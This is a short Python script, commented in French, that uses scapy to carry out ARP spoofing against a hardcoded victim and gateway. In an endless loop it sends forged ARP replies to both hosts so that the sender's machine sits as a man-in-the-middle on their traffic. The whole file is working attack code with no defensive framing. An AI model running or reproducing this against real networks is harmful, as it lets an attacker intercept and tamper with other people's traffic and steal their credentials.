import scapy.all as scapy

import time

# IP de la victime
target_ip = "172.20.10.253"

# IP de la passerelle
gateway_ip = "172.20.0.1"

# MAC de la victime
target_mac = "08:00:27:8a:21:f4".strip()

# MAC de la passerelle
gateway_mac = "00:1c:7f:a2:4c:a3".strip()

# Notre MAC
your_mac = "F4:A4:75:7A:BF:52"

while True:
    scapy.send(scapy.ARP(op=2, psrc=gateway_ip, hwsrc=your_mac, pdst=target_ip, hwdst=target_mac), verbose=0)
    scapy.send(scapy.ARP(op=2, psrc=target_ip, hwsrc=your_mac, pdst=gateway_ip, hwdst=gateway_mac), verbose=0)
    time.sleep(0.5)
